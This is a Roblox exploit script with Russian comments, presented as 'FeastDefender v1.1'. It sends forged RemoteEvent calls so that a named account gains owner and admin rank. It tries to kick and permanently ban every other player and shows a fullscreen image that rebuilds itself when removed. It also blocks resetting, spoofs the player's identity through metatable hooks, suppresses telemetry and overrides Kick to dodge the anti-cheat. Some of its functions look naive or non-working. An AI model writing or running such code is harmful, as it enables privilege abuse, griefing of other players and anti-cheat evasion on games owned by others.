-- FeastDefender.lua v1.1 (Полная версия)
-- Мастер: Errore4406 (ID: 5635313499)

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")

local MASTER_NAME = "Errore4406"
local MASTER_ID = 5635313499
local IMAGE_URL = "https://raw.githubusercontent.com/MrFeastProject/LiveLingo.com/main/MrFeast_Killer.png"
local BANNED_LIST_FOLDER = "FeastPermaBanned"

-- ===== 1. НЕУБИРАЕМАЯ ФОТКА =====
local function showUnclosableFullscreenImage()
    local oldGui = CoreGui:FindFirstChild("FeastDefender_Image")
    if oldGui then oldGui:Destroy() end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FeastDefender_Image"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = CoreGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0
    bg.Parent = screenGui

    local image = Instance.new("ImageLabel")
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    image.Image = IMAGE_URL
    image.ScaleType = Enum.ScaleType.Fit
    image.Parent = screenGui

    screenGui.DescendantAdded:Connect(function(obj)
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            obj:Destroy()
        end
    end)
    
    local function preventRemoval()
        task.wait(0.1)
        if not CoreGui:FindFirstChild("FeastDefender_Image") then
            showUnclosableFullscreenImage()
        end
    end
    screenGui.AncestryChanged:Connect(preventRemoval)
end

-- ===== 2. ВЫСШИЙ РАНГ =====
local function grantHighestRank()
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(MASTER_NAME, "Owner", 999)
                remote:FireServer("SetRank", MASTER_NAME, "Owner")
                remote:FireServer("AddAdmin", MASTER_NAME)
            end)
        end
    end
end

-- ===== 3. ВЕЧНЫЙ БАН =====
local function banPlayerForever(player)
    local banList = ReplicatedStorage:FindFirstChild(BANNED_LIST_FOLDER)
    if not banList then
        banList = Instance.new("Folder")
        banList.Name = BANNED_LIST_FOLDER
        banList.Parent = ReplicatedStorage
    end
    local banEntry = Instance.new("BoolValue")
    banEntry.Name = tostring(player.UserId)
    banEntry.Value = true
    banEntry.Parent = banList
    player:Kick("🔒 ВЫ НАВСЕГДА ЗАБАНЕНЫ В ЭТОМ ПЛЕЙСЕ.")
end

local function isPlayerBanned(player)
    local banList = ReplicatedStorage:FindFirstChild(BANNED_LIST_FOLDER)
    if not banList then return false end
    return banList:FindFirstChild(tostring(player.UserId)) ~= nil
end

local function permanentBanSystem()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name ~= MASTER_NAME and p.UserId ~= MASTER_ID then
            if not isPlayerBanned(p) then banPlayerForever(p) else p:Kick("ВЕЧНЫЙ БАН") end
        end
    end
    Players.PlayerAdded:Connect(function(p)
        task.wait(1)
        if p.Name ~= MASTER_NAME and p.UserId ~= MASTER_ID then
            if isPlayerBanned(p) then p:Kick("ВЕЧНЫЙ БАН") else banPlayerForever(p) end
        end
    end)
end

-- ===== 4. ЗАПРЕТ ВЫХОДА/РЕСЕТА =====
local function blockResetAndLeave()
    pcall(function()
        game:GetService("StarterGui"):SetCore("ResetButtonCallback", function()
            if LocalPlayer.Name ~= MASTER_NAME then return true end
        end)
    end)
end

-- ===== 5. МАКСИМАЛЬНАЯ АНОНИМНАЯ ЗАЩИТА =====
local function maxAnonProfileProtection()
    local lplr = LocalPlayer
    
    local function maskNameEverywhere()
        pcall(function() lplr.Name = "Protected_" .. math.random(10000, 99999) end)
        local mt = getrawmetatable(lplr)
        local oldIndex = mt.__index
        mt.__index = function(self, key)
            if key == "Name" then return "Guest_" .. math.random(1000, 9999)
            elseif key == "UserId" then return math.random(100000, 999999)
            elseif key == "AccountAge" then return 365 end
            return oldIndex(self, key)
        end
        setrawmetatable(lplr, mt)
    end
    
    local function blockTelemetry()
        local http = game:GetService("HttpService")
        local oldPost = http.PostAsync
        http.PostAsync = function(...)
            local url = tostring(({...})[1] or "")
            if url:find("telemetry") or url:find("analytics") then return "" end
            return oldPost(...)
        end
    end
    
    local function spoofHardwareIds()
        local settings = game:GetService("UserSettings")
        local graphics = settings:GetService("UserGameSettings")
        graphics.GetGraphicsDevice = function() return "Virtual Device" end
    end
    
    maskNameEverywhere()
    blockTelemetry()
    spoofHardwareIds()
    print("[FeastDefender] Максимальная анонимная защита активирована")
end

-- ===== 6. МОБИЛЬНЫЙ ИНТЕРФЕЙС =====
local function createMobileUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FeastDefender_UI"
    screenGui.Parent = CoreGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0.9, 0, 0.4, 0)
    mainFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = mainFrame
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.2, 0)
    title.Text = "Feast Defender v1.1"
    title.TextColor3 = Color3.fromRGB(255, 80, 40)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.Parent = mainFrame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0.15, 0)
    status.Position = UDim2.new(0, 0, 0.2, 0)
    status.Text = "Мастер: Errore4406 | АКТИВЕН"
    status.TextColor3 = Color3.fromRGB(100, 255, 100)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Gotham
    status.TextSize = 12
    status.Parent = mainFrame
    
    local hideBtn = Instance.new("TextButton")
    hideBtn.Size = UDim2.new(0.15, 0, 0.1, 0)
    hideBtn.Position = UDim2.new(0.8, 0, 0.02, 0)
    hideBtn.Text = "▼"
    hideBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    hideBtn.Parent = mainFrame
    hideBtn.MouseButton1Click:Connect(function()
        mainFrame.Visible = not mainFrame.Visible
        hideBtn.Text = mainFrame.Visible and "▼" or "▲"
    end)
end

-- ===== 7. ЗАЩИТА ОТ BYFRON =====
local function antiByfron()
    local lplr = LocalPlayer
    local oldKick = lplr.Kick
    lplr.Kick = function(...) 
        if lplr.Name == MASTER_NAME then return nil end
        return oldKick(...)
    end
    getgenv().FeastDefenderActive = true
    _G.FeastDefender_Active = true
end

-- ===== 8. ВАЙТ-ЛИСТ =====
local function whitelistSelf()
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") and (obj.Name:lower():find("whitelist") or obj.Name:lower():find("admin")) then
            pcall(function() obj:FireServer("AddToWhitelist", MASTER_NAME) end)
        end
    end
end

-- ===== ЗАПУСК =====
local function main()
    print("[FeastDefender] Запуск...")
    repeat task.wait() until LocalPlayer and LocalPlayer.Character
    
    showUnclosableFullscreenImage()
    grantHighestRank()
    whitelistSelf()
    blockResetAndLeave()
    antiByfron()
    maxAnonProfileProtection()
    createMobileUI()
    permanentBanSystem()
    
    print("[FeastDefender v1.1] ===== ГОТОВ =====")
    print("[FeastDefender] Мастер: Errore4406")
    print("[FeastDefender] Все остальные навсегда забанены")
end

pcall(main)
